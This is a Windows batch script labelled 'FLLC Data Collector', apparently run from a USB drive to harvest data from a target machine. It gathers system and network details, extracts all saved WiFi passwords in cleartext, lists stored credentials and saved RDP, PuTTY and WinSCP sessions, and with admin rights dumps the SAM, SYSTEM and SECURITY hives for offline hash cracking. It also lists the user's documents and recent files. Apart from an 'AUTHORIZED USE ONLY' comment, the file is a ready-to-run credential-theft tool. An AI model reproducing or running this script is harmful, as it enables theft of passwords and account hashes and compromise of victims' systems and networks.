@echo off
REM ============================================================================
REM  FLLC - Windows Data Collector (CMD Fallback)
REM  For environments where PowerShell is blocked/restricted
REM  AUTHORIZED USE ONLY
REM ============================================================================

setlocal enabledelayedexpansion

REM Auto-detect drive letter
set "DRIVE=%~d0"
if "%DRIVE%"=="" set "DRIVE=I:"

REM Timestamp and hostname
for /f "tokens=2 delims==" %%i in ('wmic os get localdatetime /value ^| find "="') do set dt=%%i
set "TS=%dt:~0,8%_%dt:~8,6%"
set "HOST=%COMPUTERNAME%"
set "OUT=%DRIVE%\collected\%HOST%_%TS%"

REM Create directory structure
mkdir "%OUT%\system" 2>nul
mkdir "%OUT%\network" 2>nul
mkdir "%OUT%\users" 2>nul
mkdir "%OUT%\credentials" 2>nul
mkdir "%OUT%\documents" 2>nul
mkdir "%OUT%\software" 2>nul

echo [%date% %time%] FLLC DATA COLLECTION STARTED > "%OUT%\collection.log"
echo [%date% %time%] Target: %HOST% >> "%OUT%\collection.log"

REM ============================================================================
REM  SYSTEM INFORMATION
REM ============================================================================

echo [*] Collecting system information...
echo [%date% %time%] Phase 1: System Info >> "%OUT%\collection.log"

systeminfo > "%OUT%\system\systeminfo.txt" 2>nul
set > "%OUT%\system\environment.txt" 2>nul
tasklist /v > "%OUT%\system\processes.txt" 2>nul
sc query > "%OUT%\system\services.txt" 2>nul
wmic bios get serialnumber > "%OUT%\system\bios_serial.txt" 2>nul
wmic cpu get name > "%OUT%\system\cpu.txt" 2>nul
wmic os get caption,version,osarchitecture > "%OUT%\system\os_info.txt" 2>nul
wmic logicaldisk get caption,description,filesystem,size,freespace > "%OUT%\system\drives.txt" 2>nul
wmic startup get caption,command,location,user > "%OUT%\system\startup.txt" 2>nul
wmic qfe get hotfixid,description,installedon > "%OUT%\system\hotfixes.txt" 2>nul

REM ============================================================================
REM  NETWORK INFORMATION
REM ============================================================================

echo [*] Collecting network information...
echo [%date% %time%] Phase 2: Network >> "%OUT%\collection.log"

ipconfig /all > "%OUT%\network\ipconfig.txt" 2>nul
arp -a > "%OUT%\network\arp.txt" 2>nul
route print > "%OUT%\network\routes.txt" 2>nul
netstat -ano > "%OUT%\network\netstat.txt" 2>nul
ipconfig /displaydns > "%OUT%\network\dns_cache.txt" 2>nul
nbtstat -n > "%OUT%\network\netbios.txt" 2>nul
net share > "%OUT%\network\shares.txt" 2>nul
net use > "%OUT%\network\mapped_drives.txt" 2>nul
netsh advfirewall show allprofiles > "%OUT%\network\firewall_status.txt" 2>nul

REM WiFi profiles
netsh wlan show profiles > "%OUT%\network\wifi_profiles.txt" 2>nul

REM Extract WiFi passwords
echo SSID,Password > "%OUT%\network\wifi_passwords.csv"
for /f "tokens=2 delims=:" %%a in ('netsh wlan show profiles ^| findstr "All User Profile"') do (
    set "SSID=%%a"
    set "SSID=!SSID:~1!"
    for /f "tokens=2 delims=:" %%b in ('netsh wlan show profile name^="!SSID!" key^=clear 2^>nul ^| findstr "Key Content"') do (
        set "PASS=%%b"
        set "PASS=!PASS:~1!"
        echo !SSID!,!PASS! >> "%OUT%\network\wifi_passwords.csv"
    )
)

REM Hosts file
if exist "C:\Windows\System32\drivers\etc\hosts" (
    copy "C:\Windows\System32\drivers\etc\hosts" "%OUT%\network\hosts.txt" >nul 2>nul
)

REM ============================================================================
REM  USER INFORMATION
REM ============================================================================

echo [*] Collecting user information...
echo [%date% %time%] Phase 3: Users >> "%OUT%\collection.log"

whoami /all > "%OUT%\users\whoami.txt" 2>nul
net user > "%OUT%\users\local_users.txt" 2>nul
net localgroup > "%OUT%\users\local_groups.txt" 2>nul
net localgroup administrators > "%OUT%\users\administrators.txt" 2>nul
dir C:\Users /b > "%OUT%\users\user_profiles.txt" 2>nul

REM ============================================================================
REM  CREDENTIALS
REM ============================================================================

echo [*] Collecting credentials...
echo [%date% %time%] Phase 4: Credentials >> "%OUT%\collection.log"

cmdkey /list > "%OUT%\credentials\credential_manager.txt" 2>nul

REM Saved RDP connections
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s > "%OUT%\credentials\rdp_connections.txt" 2>nul

REM PuTTY sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s > "%OUT%\credentials\putty_sessions.txt" 2>nul

REM WinSCP sessions
reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" /s > "%OUT%\credentials\winscp_sessions.txt" 2>nul

REM SAM hive (requires admin)
whoami /groups | findstr /i "S-1-16-12288" >nul 2>nul
if %errorlevel% equ 0 (
    echo [*] Admin detected - dumping registry hives...
    reg save HKLM\SAM "%OUT%\credentials\SAM.hive" /y >nul 2>nul
    reg save HKLM\SYSTEM "%OUT%\credentials\SYSTEM.hive" /y >nul 2>nul
    reg save HKLM\SECURITY "%OUT%\credentials\SECURITY.hive" /y >nul 2>nul
)

REM ============================================================================
REM  DOCUMENTS & FILES
REM ============================================================================

echo [*] Collecting file listings...
echo [%date% %time%] Phase 5: Documents >> "%OUT%\collection.log"

dir "%USERPROFILE%\Desktop" /s /b > "%OUT%\documents\desktop_files.txt" 2>nul
dir "%USERPROFILE%\Documents" /s /b > "%OUT%\documents\documents_files.txt" 2>nul
dir "%USERPROFILE%\Downloads" /s /b > "%OUT%\documents\downloads_files.txt" 2>nul
dir "%APPDATA%\Microsoft\Windows\Recent" /b > "%OUT%\documents\recent_files.txt" 2>nul

REM ============================================================================
REM  SOFTWARE INVENTORY
REM ============================================================================

echo [*] Collecting software inventory...
echo [%date% %time%] Phase 6: Software >> "%OUT%\collection.log"

wmic product get name,version,vendor > "%OUT%\software\installed_software.txt" 2>nul
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall" /s > "%OUT%\software\uninstall_registry.txt" 2>nul

REM ============================================================================
REM  FINALIZE
REM ============================================================================

echo [%date% %time%] COLLECTION COMPLETE >> "%OUT%\collection.log"

REM Count files
set /a FCOUNT=0
for /r "%OUT%" %%f in (*) do set /a FCOUNT+=1

echo.
echo ============================================
echo  FLLC - COLLECTION COMPLETE
echo ============================================
echo  Target:    %HOST%
echo  Files:     %FCOUNT%
echo  Output:    %OUT%
echo ============================================

echo  Target: %HOST% > "%OUT%\SUMMARY.txt"
echo  Files: %FCOUNT% >> "%OUT%\SUMMARY.txt"
echo  Output: %OUT% >> "%OUT%\SUMMARY.txt"

endlocal
